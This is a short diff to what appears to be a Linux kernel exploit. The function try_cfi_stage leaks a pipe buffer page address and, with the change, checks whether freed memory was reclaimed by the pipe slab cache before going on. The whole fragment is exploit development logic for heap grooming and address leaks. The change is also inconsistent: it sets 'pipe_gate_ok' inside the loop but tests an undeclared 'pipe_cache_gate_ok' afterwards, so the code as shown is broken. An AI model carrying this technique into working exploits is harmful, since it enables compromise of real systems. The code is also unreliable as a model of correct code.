@@ -511,11 +511,18 @@ int try_cfi_stage(void) {
             "attempt=%d/%d\n",
             pipebuf_page_base, first_leak_attempt + 1,
             PIPE_FIRST_LEAK_ATTEMPTS);
+    int pipe_gate_ok = 0;
     if (is_direct_ptr(pipebuf_page_base)) {
+      pipe_gate_ok = pipe_reclaim_cache_gate(fd);
+    }
+    pr_info("fresh pipe page cache %s slab=%016zx want=%016zx hit=%d\n",
+            pipe_gate_ok ? "ok" : "rejected", candidate_slab_cache,
+            kmalloc_pipe_cache, pipe_cache_slot_hit);
+    if (pipe_gate_ok) {
       break;
     }
   }
-  if (!is_direct_ptr(pipebuf_page_base)) {
+  if (!is_direct_ptr(pipebuf_page_base) || !pipe_cache_gate_ok) {
     cfi_last_step = 8;
     cfi_last_errno = errno;
     goto fail;
